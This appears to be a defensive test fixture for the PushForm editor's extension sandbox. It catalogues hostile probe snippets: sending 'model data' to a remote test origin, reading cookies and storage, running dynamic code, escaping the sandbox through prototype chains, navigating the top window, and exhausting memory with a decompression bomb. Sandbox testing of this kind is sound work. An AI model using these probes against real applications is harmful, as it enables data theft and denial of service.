// SPDX-License-Identifier: GPL-3.0-or-later
// Copyright 2026 PushForm contributors
// The attacks hostile extensions make, by category. Each runs inside the extension's runtime as `(p) => ...`, where
// `p` holds the origins and tag of the test; the helpers `remote`, `editor` and `settle` come from the probe library.
import type { Attack } from './support';

export const NETWORK: Record<string, Attack> = {
  fetchEditor: { title: 'fetch from the editor origin', code: `(p) => fetch(editor(p, 'fetch')).then((r) => r.status)` },
  fetchRemote: { title: 'fetch from another origin', code: `(p) => fetch(remote(p, 'fetch')).then((r) => r.status)` },
  fetchNoCors: { title: 'fetch with mode no-cors', code: `(p) => fetch(remote(p, 'no-cors'), { mode: 'no-cors' }).then((r) => r.type)` },
  fetchKeepalivePost: { title: 'POST with keepalive', code: `(p) => fetch(remote(p, 'post'), { method: 'POST', body: 'model data', keepalive: true }).then((r) => r.status)` },
  fetchDataUrl: { title: 'fetch a data: URL', code: `() => fetch('data:text/plain,x').then((r) => r.text())` },
  xhr: { title: 'XMLHttpRequest', code: `(p) => new Promise((resolve, reject) => { const x = new XMLHttpRequest(); x.open('GET', remote(p, 'xhr')); x.onload = () => resolve(x.status); x.onerror = () => reject(new Error('error event')); x.send(); })` },
  xhrSync: { title: 'synchronous XMLHttpRequest', code: `(p) => { const x = new XMLHttpRequest(); x.open('GET', remote(p, 'xhr-sync'), false); x.send(); return x.status; }` },
  webSocket: { title: 'WebSocket', code: `(p) => settle(new WebSocket(remote(p, 'ws').replace(/^http/, 'ws')), 'onopen', 'onerror')` },
  eventSource: { title: 'EventSource', code: `(p) => { const e = new EventSource(remote(p, 'events')); return settle(e, 'onopen', 'onerror').finally(() => e.close()); }` },
  webTransport: { title: 'WebTransport', code: `(p) => new WebTransport(remote(p, 'wt').replace(/^http:/, 'https:')).ready` },
  sendBeacon: { title: 'navigator.sendBeacon', code: `(p) => { if (!navigator.sendBeacon(remote(p, 'beacon'), 'model data')) throw new Error('refused'); return 'queued'; }` },
  importRemote: { title: 'import() of a module from another origin', code: `(p) => import(remote(p, 'module.js'))` },
  importEditor: { title: 'import() of a module from the editor origin', code: `(p) => import(editor(p, 'module.js'))` },
  importScriptsRemote: { title: 'importScripts from another origin', code: `(p) => importScripts(remote(p, 'classic.js'))` },
  fontFace: { title: 'load a font from another origin', code: `(p) => new FontFace('x', 'url(' + remote(p, 'font') + ')').load()` },
  image: { title: 'load an image', code: `(p) => { const i = new Image(); i.src = remote(p, 'img'); return settle(i, 'onload', 'onerror'); }` },
  stylesheet: { title: 'load a stylesheet', code: `(p) => new CSSStyleSheet().replace('@import url(' + remote(p, 'css') + ');')` },
  serviceWorker: { title: 'register a service worker', code: `(p) => navigator.serviceWorker.register(remote(p, 'sw.js'))` },
  webRtc: { title: 'WebRTC towards a STUN server', code: `(p) => { const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:' + p.stun }] }); pc.createDataChannel('x'); return pc.createOffer().then((o) => pc.setLocalDescription(o)).then(() => new Promise((r) => setTimeout(() => r(pc.iceGatheringState), 800))); }` },
};

export const STORAGE: Record<string, Attack> = {
  localStorage: { title: 'read the editor\'s localStorage', code: `() => localStorage.getItem('pf-secret')` },
  sessionStorage: { title: 'read the editor\'s sessionStorage', code: `() => sessionStorage.getItem('pf-secret')` },
  documentCookie: { title: 'read the editor\'s cookies', code: `() => document.cookie` },
  cookieStore: { title: 'read cookies through cookieStore', code: `() => cookieStore.getAll()` },
  indexedDbOpen: { title: 'open the editor\'s IndexedDB database', code: `() => new Promise((resolve, reject) => { const r = indexedDB.open('pf-secret-db'); r.onsuccess = () => resolve([...r.result.objectStoreNames]); r.onerror = () => reject(r.error); })` },
  indexedDbList: { title: 'list IndexedDB databases', code: `() => indexedDB.databases()` },
  cacheStorage: { title: 'read Cache Storage', code: `() => caches.keys()` },
  originPrivateFiles: { title: 'open the origin private file system', code: `() => navigator.storage.getDirectory()` },
  webLocks: { title: 'use Web Locks', code: `() => navigator.locks.query()` },
  broadcastChannel: { title: 'listen to the editor\'s BroadcastChannel', code: `() => new Promise((resolve, reject) => { const c = new BroadcastChannel('pushform'); c.onmessage = (e) => resolve(e.data); setTimeout(() => { c.close(); reject(new Error('no message')); }, 400); })` },
  editorObjects: { title: 'reach the editor\'s window, document or parent', code: `() => { if (typeof window !== 'undefined' || typeof document !== 'undefined' || typeof parent !== 'undefined' || typeof top !== 'undefined') return 'reachable'; throw new ReferenceError('no window, document, parent or top'); }` },
};

const WASM_HEADER = '[0, 97, 115, 109, 1, 0, 0, 0]';
export const DYNAMIC_CODE: Record<string, Attack> = {
  eval: { title: 'eval', code: `() => eval('1 + 1')` },
  indirectEval: { title: 'indirect eval', code: `() => (0, eval)('1 + 1')` },
  functionConstructor: { title: 'new Function', code: `() => new Function('return 1')()` },
  asyncFunctionConstructor: { title: 'the AsyncFunction constructor', code: `() => (async () => {}).constructor('return 1')()` },
  generatorFunctionConstructor: { title: 'the GeneratorFunction constructor', code: `() => (function* () {}).constructor('yield 1')().next().value` },
  setTimeoutString: { title: 'setTimeout with a string', code: `() => new Promise((resolve, reject) => { self.__ran = false; setTimeout('self.__ran = true', 0); setTimeout(() => self.__ran ? resolve('ran') : reject(new Error('the string was not run')), 150); })` },
  setIntervalString: { title: 'setInterval with a string', code: `() => new Promise((resolve, reject) => { self.__ran2 = false; const t = setInterval('self.__ran2 = true', 10); setTimeout(() => { clearInterval(t); self.__ran2 ? resolve('ran') : reject(new Error('the string was not run')); }, 150); })` },
  importDataUrl: { title: 'import() of a data: URL', code: `() => import(['data:text/javascript', 'export default 1'].join(','))` },
  importDataUrlFromBytes: { title: 'import() of code received as data (FileReaderSync data: URL)', code: `() => import(new FileReaderSync().readAsDataURL(new Blob(['export default 1'], { type: 'text/javascript' })))` },
  createObjectUrl: { title: 'URL.createObjectURL', code: `() => URL.createObjectURL(new Blob(['export default 1'], { type: 'text/javascript' }))` },
  restoreCreateObjectUrl: { title: 'put URL.createObjectURL back', code: `() => { Object.defineProperty(URL, 'createObjectURL', { value: () => 'x' }); return URL.createObjectURL(); }` },
  importEditorBlob: { title: 'import() of a blob: module the editor made', code: `(p) => import(p.editorBlob).then(() => self.__pwned ?? 'imported')` },
  fetchEditorBlob: { title: 'fetch a blob: the editor made', code: `(p) => fetch(p.editorBlob).then((r) => r.text())` },
  webAssemblyCompile: { title: 'WebAssembly.compile', code: `() => WebAssembly.compile(new Uint8Array(${WASM_HEADER}))` },
  webAssemblyModule: { title: 'new WebAssembly.Module', code: `() => new WebAssembly.Module(new Uint8Array(${WASM_HEADER}))` },
  webAssemblyAnywhere: { title: 'find WebAssembly on the prototype chain', code: `() => { for (let o = self; o; o = Object.getPrototypeOf(o)) { const d = Object.getOwnPropertyDescriptor(o, 'WebAssembly'); if (d && d.value) return 'found'; } throw new Error('not found'); }` },
};

export const OUTSIDE_MODULES: Record<string, Attack> = {
  importUnlinkedPackageFile: { title: 'import() of a package file by computed URL', code: `() => import(new URL('./extra.js', import.meta.url).href)` },
  importComputedRelative: { title: 'import() of a computed relative path', code: `() => import('./' + ['extra', 'js'].join('.'))` },
  importEditorSource: { title: 'import() of the editor\'s own scripts', code: `(p) => import(p.editor + '/harness.js')` },
};

export const NESTED_WORKERS: Record<string, Attack> = {
  worker: { title: 'new Worker', code: `() => new Worker('data:text/javascript,1')` },
  workerOfSelf: { title: 'new Worker of its own module', code: `() => new Worker(import.meta.url, { type: 'module' })` },
  sharedWorker: { title: 'new SharedWorker', code: `() => new SharedWorker('data:text/javascript,1')` },
  importScripts: { title: 'importScripts', code: `() => importScripts('data:text/javascript,1')` },
  importScriptsFromPrototype: { title: 'importScripts from the scope\'s prototype', code: `() => Object.getPrototypeOf(Object.getPrototypeOf(self)).importScripts.call(self, 'data:text/javascript,1')` },
  importScriptsFromInterface: { title: 'importScripts from WorkerGlobalScope.prototype', code: `() => WorkerGlobalScope.prototype.importScripts.call(self, 'data:text/javascript,1')` },
  workerAnywhere: { title: 'find Worker on the prototype chain', code: `() => { for (let o = self; o; o = Object.getPrototypeOf(o)) { const d = Object.getOwnPropertyDescriptor(o, 'Worker'); if (d && d.value) return 'found'; } throw new Error('not found'); }` },
  serviceWorker: { title: 'register a service worker', code: `() => navigator.serviceWorker.register('sw.js')` },
};

export const NAVIGATION: Record<string, Attack> = {
  windowOpen: { title: 'window.open', code: `(p) => open(remote(p, 'open'))` },
  topLocation: { title: 'navigate the top window', code: `(p) => { top.location.href = remote(p, 'top'); return 'assigned'; }` },
  parentLocation: { title: 'navigate the parent window', code: `(p) => { parent.location.href = remote(p, 'parent'); return 'assigned'; }` },
  ownLocation: { title: 'navigate its own scope', code: `(p) => { location.href = remote(p, 'self'); return location.href; }` },
  formSubmit: { title: 'submit a form', code: `(p) => { const f = document.createElement('form'); f.action = remote(p, 'form'); f.submit(); return 'submitted'; }` },
  clientsOpen: { title: 'open a window through clients', code: `(p) => clients.openWindow(remote(p, 'clients'))` },
};

const MiB = 'Math.pow(2, 20)';
/** Each allocates 512 MiB, twice the binary budget of one extension. */
export const BINARY_BUDGET: Record<string, Attack> = {
  typedArray: { title: 'a 512 MiB Uint8Array', code: `() => new Uint8Array(512 * ${MiB}).length` },
  arrayBuffer: { title: 'a 512 MiB ArrayBuffer', code: `() => new ArrayBuffer(512 * ${MiB}).byteLength` },
  heldBuffers: { title: 'many 16 MiB buffers held at once', code: `() => { const keep = []; for (let i = 0; i < 32; i++) keep.push(new ArrayBuffer(16 * ${MiB})); return keep.length * 16 + ' MiB'; }` },
  nativeArrayBufferFromPrototype: { title: 'the original ArrayBuffer reached through the replacement\'s prototype', code: `() => new (Object.getPrototypeOf(ArrayBuffer))(512 * ${MiB}).byteLength` },
  nativeArrayBufferFromInstance: { title: 'the original ArrayBuffer reached through a buffer\'s constructor', code: `() => new (new Uint8Array(1).buffer.constructor)(512 * ${MiB}).byteLength` },
  nativeTypedArrayFromPrototype: { title: 'the original Uint8Array reached through the replacement\'s prototype', code: `() => new (Object.getPrototypeOf(Uint8Array))(512 * ${MiB}).length` },
  transfer: { title: 'ArrayBuffer.prototype.transfer to a larger size', code: `() => new ArrayBuffer(8).transfer(512 * ${MiB}).byteLength` },
  resize: { title: 'resize a resizable buffer past its counted size', code: `() => { const b = new ArrayBuffer(8, { maxByteLength: 512 * ${MiB} }); b.resize(512 * ${MiB}); return b.byteLength; }` },
  structuredCloneCopies: { title: 'structuredClone copies of one counted buffer', code: `() => { const b = new Uint8Array(128 * ${MiB}); const keep = [b]; for (let i = 0; i < 4; i++) keep.push(structuredClone(b)); return keep.length * 128 + ' MiB'; }` },
  blobAmplification: { title: 'one 16 MiB buffer repeated in a Blob and read back', code: `async () => { const b = new Uint8Array(16 * ${MiB}); return (await new Blob(Array(32).fill(b)).arrayBuffer()).byteLength; }` },
  decompression: { title: 'decompressing a small gzip stream to 512 MiB', code: `async () => { const z = new Uint8Array(16 * ${MiB}); const gz = await new Response(new Blob(Array(32).fill(z)).stream().pipeThrough(new CompressionStream('gzip'))).arrayBuffer(); return { compressed: gz.byteLength, out: (await new Response(new Blob([gz]).stream().pipeThrough(new DecompressionStream('gzip'))).arrayBuffer()).byteLength }; }` },
};
